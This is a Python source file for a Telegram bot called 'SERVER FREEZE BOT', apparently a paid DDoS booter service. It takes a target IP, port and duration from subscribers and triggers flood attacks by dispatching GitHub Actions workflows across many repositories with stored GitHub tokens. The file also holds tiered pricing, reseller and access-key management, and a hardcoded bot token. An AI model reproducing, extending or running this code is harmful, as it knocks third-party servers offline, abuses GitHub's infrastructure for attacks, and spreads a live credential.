import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from github import Github, GithubException

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Bot Configuration
BOT_TOKEN = "8579474154:AAH16AmOzDPQGlCz14-D10PdZLWnrVTsssY"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
ADMIN_IDS = [8101867786]

# Global Variables
current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
user_attack_counts = {}
user_states = {}
attack_timers = {}

# Pricing
USER_PRICES = {"1": 120, "2": 240, "3": 360, "4": 450, "7": 650}
RESELLER_PRICES = {"1": 150, "2": 250, "3": 300, "4": 400, "7": 550}

logger.info("✅ Part 1: Imports & Config loaded")
# Part 2: Data Load/Save Functions

def load_users():
    try:
        with open('users.json', 'r') as f:
            users_data = json.load(f)
            return set(users_data) if users_data else set(ADMIN_IDS)
    except FileNotFoundError:
        save_users(ADMIN_IDS)
        return set(ADMIN_IDS)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(list(users), f, indent=2)

def load_pending_users():
    try:
        with open('pending_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_pending_users(pending_users):
    with open('pending_users.json', 'w') as f:
        json.dump(pending_users, f, indent=2)

def load_approved_users():
    try:
        with open('approved_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as f:
        json.dump(approved_users, f, indent=2)

def load_owners():
    try:
        with open('owners.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        owners = {}
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": True
            }
        save_owners(owners)
        return owners

def save_owners(owners):
    with open('owners.json', 'w') as f:
        json.dump(owners, f, indent=2)

def load_admins():
    try:
        with open('admins.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_admins(admins):
    with open('admins.json', 'w') as f:
        json.dump(admins, f, indent=2)

def load_resellers():
    try:
        with open('resellers.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_resellers(resellers):
    with open('resellers.json', 'w') as f:
        json.dump(resellers, f, indent=2)

def load_github_tokens():
    try:
        with open('github_tokens.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_github_tokens(tokens):
    with open('github_tokens.json', 'w') as f:
        json.dump(tokens, f, indent=2)

def load_trial_keys():
    try:
        with open('trial_keys.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_trial_keys(keys):
    with open('trial_keys.json', 'w') as f:
        json.dump(keys, f, indent=2)

def load_maintenance_mode():
    try:
        with open('maintenance.json', 'r') as f:
            return json.load(f).get("maintenance", False)
    except FileNotFoundError:
        return False

def save_maintenance_mode(mode):
    with open('maintenance.json', 'w') as f:
        json.dump({"maintenance": mode}, f)

def load_cooldown():
    try:
        with open('cooldown.json', 'r') as f:
            return json.load(f).get("cooldown", 40)
    except FileNotFoundError:
        return 40

def save_cooldown(duration):
    with open('cooldown.json', 'w') as f:
        json.dump({"cooldown": duration}, f)

def load_max_attacks():
    try:
        with open('max_attacks.json', 'r') as f:
            return json.load(f).get("max_attacks", 40)
    except FileNotFoundError:
        return 40

def save_max_attacks(max_attacks):
    with open('max_attacks.json', 'w') as f:
        json.dump({"max_attacks": max_attacks}, f)

# Initialize data
users = load_users()
approved_users = load_approved_users()
owners = load_owners()
admins = load_admins()
resellers = load_resellers()
github_tokens = load_github_tokens()
trial_keys = load_trial_keys()

MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()

logger.info("✅ Part 2: Data functions loaded")

# Part 3: Check & Helper Functions

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved_user(user_id):
    if str(user_id) in approved_users:
        expiry_str = approved_users[str(user_id)].get('expiry_date')
        if expiry_str:
            try:
                expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                if datetime.now() < expiry:
                    return True
                else:
                    del approved_users[str(user_id)]
                    save_approved_users(approved_users)
            except:
                pass
    return False

def has_access(user_id):
    return is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)

def format_time_remaining(expiry_str):
    try:
        expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
        remaining = expiry - datetime.now()
        if remaining.days > 0:
            return f"{remaining.days} days"
        elif remaining.seconds > 3600:
            return f"{remaining.seconds // 3600} hours"
        elif remaining.seconds > 60:
            return f"{remaining.seconds // 60} mins"
        else:
            return "Expired"
    except:
        return "N/A"

logger.info("✅ Part 3: Check functions loaded")


# Part 4: Keyboard Layouts

def get_main_keyboard(user_id):
    keyboard = []
    
    if not has_access(user_id):
        keyboard.append([InlineKeyboardButton("🔓 Request Access", callback_data="request_access")])
        keyboard.append([InlineKeyboardButton("🎁 Redeem Key", callback_data="redeem_key")])
    else:
        keyboard.append([InlineKeyboardButton("⚔️ Launch Attack", callback_data="launch_attack")])
        keyboard.append([
            InlineKeyboardButton("🛑 Stop", callback_data="stop_attack"),
            InlineKeyboardButton("📊 Status", callback_data="check_status")
        ])
    
    if is_owner(user_id):
        keyboard.append([InlineKeyboardButton("👑 Owner Panel", callback_data="owner_panel")])
    
    keyboard.append([
        InlineKeyboardButton("📌 My Access", callback_data="my_access"),
        InlineKeyboardButton("❓ Help", callback_data="help")
    ])
    
    return InlineKeyboardMarkup(keyboard)

def get_owner_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 User Management", callback_data="user_mgmt")],
        [InlineKeyboardButton("📝 Pending Requests", callback_data="pending_requests")],
        [InlineKeyboardButton("🔑 Token Management", callback_data="token_mgmt")],
        [InlineKeyboardButton("⚙️ Bot Settings", callback_data="bot_settings")],
        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
    ])

def get_back_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]])

def get_cancel_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])

logger.info("✅ Part 4: Keyboards loaded")

# Part 5: Command Handlers

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name or "User"
    
    # Notify owners about new users
    if not has_access(user_id) and user_id not in ADMIN_IDS:
        pending = load_pending_users()
        if not any(req.get('user_id') == user_id for req in pending):
            for owner_id in owners.keys():
                try:
                    await context.bot.send_message(
                        chat_id=int(owner_id),
                        text=f"🔔 **NEW USER**\n\n👤 @{username}\n🆔 `{user_id}`\n\nNo access yet.",
                        parse_mode='Markdown'
                    )
                except:
                    pass
    
    text = f"""🔥 **SERVER FREEZE BOT** 🔥

Welcome, {username}!

🎯 Method: BGM FLOOD
⚡ Cooldown: {COOLDOWN_DURATION}s
🎯 Max Attacks: {MAX_ATTACKS}

Use buttons below:"""
    
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=get_main_keyboard(user_id), parse_mode='Markdown')
    else:
        await update.message.reply_text(text, reply_markup=get_main_keyboard(user_id), parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = """❓ **HELP & COMMANDS**

**User Commands:**
/start - Start bot
/help - Show help
/myaccess - Check access
/status - Attack status
/stop - Stop attack
/redeem <key> - Redeem key

**Features:**
• Launch attacks via buttons
• Real-time status
• Stop anytime

**Access:**
Request access or redeem key

**Support:**
Contact owner"""
    
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=get_back_keyboard(), parse_mode='Markdown')
    else:
        await update.message.reply_text(text, parse_mode='Markdown')

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, cooldown_until
    
    user_id = update.effective_user.id
    text = "📊 **STATUS**\n\n"
    
    if MAINTENANCE_MODE:
        text += "🔧 Maintenance Mode"
    elif user_id in attack_timers and attack_timers[user_id].get('active'):
        timer_data = attack_timers[user_id]
        elapsed = int(time.time() - timer_data['start'])
        remaining = max(0, timer_data['duration'] - elapsed)
        text += f"🚀 **Attack Running**\n"
        text += f"🎯 {timer_data['target']}:{timer_data['port']}\n"
        text += f"⏱️ {remaining}s remaining"
    elif cooldown_until > time.time():
        remaining = int(cooldown_until - time.time())
        text += f"⏳ Cooldown: {remaining}s"
    else:
        text += "✅ Ready"
    
    text += f"\n\n🔑 Servers: {len(github_tokens)}"
    
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=get_back_keyboard(), parse_mode='Markdown')
    else:
        await update.message.reply_text(text, parse_mode='Markdown')

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not has_access(user_id):
        await update.message.reply_text("❌ No access")
        return
    
    if user_id in attack_timers and attack_timers[user_id].get('active'):
        attack_timers[user_id]['active'] = False
        await update.message.reply_text("✅ Attack stopped")
    else:
        await update.message.reply_text("⚠️ No active attack")

logger.info("✅ Part 5: Commands loaded")

# Part 6: Button/Callback Handler

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "main_menu":
        await start(update, context)
    
    elif data == "help":
        await help_command(update, context)
    
    elif data == "launch_attack":
        if not has_access(user_id):
            await query.answer("❌ No access!", show_alert=True)
            return
        
        if MAINTENANCE_MODE:
            await query.answer("🔧 Maintenance mode", show_alert=True)
            return
        
        if user_id in attack_timers and attack_timers[user_id].get('active'):
            await query.answer("⚠️ Attack already running!", show_alert=True)
            return
        
        if cooldown_until > time.time():
            remaining = int(cooldown_until - time.time())
            await query.answer(f"⏳ Cooldown: {remaining}s", show_alert=True)
            return
        
        if not github_tokens:
            await query.answer("❌ No servers!", show_alert=True)
            return
        
        user_states[user_id] = {"step": "ip"}
        await query.edit_message_text(
            "🎯 **LAUNCH ATTACK**\n\nEnter target IP:",
            reply_markup=get_cancel_keyboard()
        )
    
    elif data == "stop_attack":
        if user_id in attack_timers and attack_timers[user_id].get('active'):
            attack_timers[user_id]['active'] = False
            await query.answer("✅ Stopped", show_alert=True)
            await query.edit_message_text("✅ Attack stopped", reply_markup=get_back_keyboard())
        else:
            await query.answer("⚠️ No active attack", show_alert=True)
    
    elif data == "check_status":
        await status_command(update, context)
    
    elif data == "my_access":
        text = "📌 **YOUR ACCESS**\n\n"
        
        if is_owner(user_id):
            text += "👑 Role: Owner\n✅ Full Access"
        elif is_admin(user_id):
            text += "🛡️ Role: Admin\n✅ Active"
        elif is_reseller(user_id):
            text += f"💰 Role: Reseller\n💳 Credits: {resellers[str(user_id)].get('credits', 0)}"
        elif is_approved_user(user_id):
            text += f"✅ Active User\n⏰ {format_time_remaining(approved_users[str(user_id)]['expiry_date'])}"
        else:
            text += "❌ No Access"
        
        await query.edit_message_text(text, reply_markup=get_back_keyboard(), parse_mode='Markdown')
    
    elif data == "owner_panel":
        if not is_owner(user_id):
            await query.answer("❌ Owner only!", show_alert=True)
            return
        
        text = f"""👑 **OWNER PANEL**

🔑 Servers: {len(github_tokens)}
👥 Users: {len(approved_users)}
📝 Pending: {len(load_pending_users())}
🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}"""
        
        await query.edit_message_text(text, reply_markup=get_owner_keyboard(), parse_mode='Markdown')
    
    elif data == "pending_requests":
        if not is_owner(user_id):
            await query.answer("❌ Owner only!", show_alert=True)
            return
        
        pending = load_pending_users()
        
        if not pending:
            await query.edit_message_text("📭 No pending requests", reply_markup=get_back_keyboard())
            return
        
        text = "📝 **PENDING REQUESTS**\n\n"
        keyboard = []
        
        for i, req in enumerate(pending[:10], 1):
            req_user_id = req['user_id']
            username = req.get('username', 'Unknown')
            text += f"{i}. @{username} - `{req_user_id}`\n"
            keyboard.append([
                InlineKeyboardButton(f"✅ {username[:10]}", callback_data=f"approve_{req_user_id}"),
                InlineKeyboardButton(f"❌", callback_data=f"reject_{req_user_id}")
            ])
        
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="owner_panel")])
        
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    
    elif data == "request_access":
        pending = load_pending_users()
        
        if any(req['user_id'] == user_id for req in pending):
            await query.edit_message_text(
                "⚠️ Request already sent\nWaiting for approval.",
                reply_markup=get_back_keyboard()
            )
            return
        
        username = query.from_user.username or f"user_{user_id}"
        
        pending.append({
            "user_id": user_id,
            "username": username,
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        save_pending_users(pending)
        
        await query.edit_message_text(
            f"✅ **REQUEST SENT**\n\n🆔 `{user_id}`\nWait for approval.",
            reply_markup=get_back_keyboard(),
            parse_mode='Markdown'
        )
        
        # Notify owners
        for owner_id in owners.keys():
            try:
                await context.bot.send_message(
                    chat_id=int(owner_id),
                    text=f"📢 **NEW ACCESS REQUEST**\n\n👤 @{username}\n🆔 `{user_id}`\n\nUse /start to view.",
                    parse_mode='Markdown'
                )
            except:
                pass
    
    elif data.startswith("approve_"):
        if not is_owner(user_id):
            await query.answer("❌ Owner only!", show_alert=True)
            return
        
        req_user_id = int(data.split("_")[1])
        user_states[user_id] = {"action": "approve", "target_id": req_user_id, "step": "days"}
        
        await query.edit_message_text(
            f"✅ Approving {req_user_id}\n\nEnter days:",
            reply_markup=get_cancel_keyboard()
        )
    
    elif data.startswith("reject_"):
        if not is_owner(user_id):
            await query.answer("❌ Owner only!", show_alert=True)
            return
        
        req_user_id = int(data.split("_")[1])
        pending = load_pending_users()
        pending = [r for r in pending if r['user_id'] != req_user_id]
        save_pending_users(pending)
        
        await query.answer("✅ Rejected", show_alert=True)
        await query.edit_message_text("❌ Request rejected", reply_markup=get_back_keyboard())
    
    elif data == "cancel":
        user_states[user_id] = None
        await query.edit_message_text("❌ Cancelled", reply_markup=get_back_keyboard())

logger.info("✅ Part 6: Buttons loaded")

# Part 7: Message Handler

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_states or not user_states[user_id]:
        return
    
    state = user_states[user_id]
    
    # Attack flow
    if state.get("step") == "ip":
        state["ip"] = text
        state["step"] = "port"
        await update.message.reply_text("🔌 Enter port:", reply_markup=get_cancel_keyboard())
    
    elif state.get("step") == "port":
        try:
            state["port"] = int(text)
            state["step"] = "time"
            await update.message.reply_text("⏱️ Enter time (seconds):", reply_markup=get_cancel_keyboard())
        except:
            await update.message.reply_text("❌ Invalid port!", reply_markup=get_cancel_keyboard())
    
    elif state.get("step") == "time":
        try:
            duration = int(text)
            if duration < 1 or duration > 300:
                await update.message.reply_text("❌ Must be 1-300s!", reply_markup=get_cancel_keyboard())
                return
            
            await launch_attack(update, context, user_id, state["ip"], state["port"], duration)
            user_states[user_id] = None
        except:
            await update.message.reply_text("❌ Invalid time!", reply_markup=get_cancel_keyboard())
    
    # Approve flow
    elif state.get("action") == "approve":
        try:
            days = int(text)
            if days < 1:
                await update.message.reply_text("❌ At least 1 day!", reply_markup=get_cancel_keyboard())
                return
            
            target_id = str(state["target_id"])
            expiry = datetime.now() + timedelta(days=days)
            
            approved_users[target_id] = {
                "username": f"user_{target_id}",
                "expiry_date": expiry.strftime("%Y-%m-%d %H:%M:%S"),
                "added_by": str(user_id),
                "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "plan": f"{days} days"
            }
            
            save_approved_users(approved_users)
            
            # Remove from pending
            pending = load_pending_users()
            pending = [r for r in pending if r['user_id'] != state["target_id"]]
            save_pending_users(pending)
            
            await update.message.reply_text(
                f"✅ User {target_id} approved for {days} days",
                reply_markup=get_back_keyboard()
            )
            
            # Notify user
            try:
                await context.bot.send_message(
                    chat_id=state["target_id"],
                    text=f"✅ ACCESS GRANTED!\n\n⏰ {days} days\nUse /start"
                )
            except:
                pass
            
            user_states[user_id] = None
        except:
            await update.message.reply_text("❌ Invalid!", reply_markup=get_cancel_keyboard())

logger.info("✅ Part 7: Messages loaded")

# Part 8: Attack Function & Main

async def launch_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id, target, port, duration):
    global cooldown_until
    
    progress = await update.message.reply_text("🚀 Launching...")
    
    # Start attack timer
    attack_timers[user_id] = {
        "active": True,
        "target": target,
        "port": port,
        "duration": duration,
        "start": time.time()
    }
    
    # Launch on GitHub
    def run_attack(token_data):
        try:
            g = Github(token_data['token'])
            repo = g.get_repo(token_data['repo'])
            workflow = repo.get_workflow("main.yml")
            workflow.create_dispatch(
                ref="main",
                inputs={"target": target, "port": str(port), "time": str(duration)}
            )
        except:
            pass
    
    threads = []
    for token_data in github_tokens:
        t = threading.Thread(target=run_attack, args=(token_data,))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    cooldown_until = time.time() + COOLDOWN_DURATION
    
    await progress.edit_text(
        f"✅ **LAUNCHED**\n\n🎯 {target}:{port}\n⏱️ {duration}s\n🔑 {len(github_tokens)} servers",
        reply_markup=get_back_keyboard(),
        parse_mode='Markdown'
    )
    
    # Auto-stop after duration
    import asyncio
    await asyncio.sleep(duration)
    
    if user_id in attack_timers and attack_timers[user_id].get('active'):
        attack_timers[user_id]['active'] = False

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("=" * 50)
    print("🤖 SERVER FREEZE BOT STARTED")
    print("=" * 50)
    print(f"👑 Owners: {len(owners)}")
    print(f"👥 Users: {len(approved_users)}")
    print(f"🔑 Servers: {len(github_tokens)}")
    print(f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}")
    print("=" * 50)
    
    app.run_polling()

if __name__ == '__main__':
    main()

logger.info("✅ Part 8: Attack & Main loaded")
    
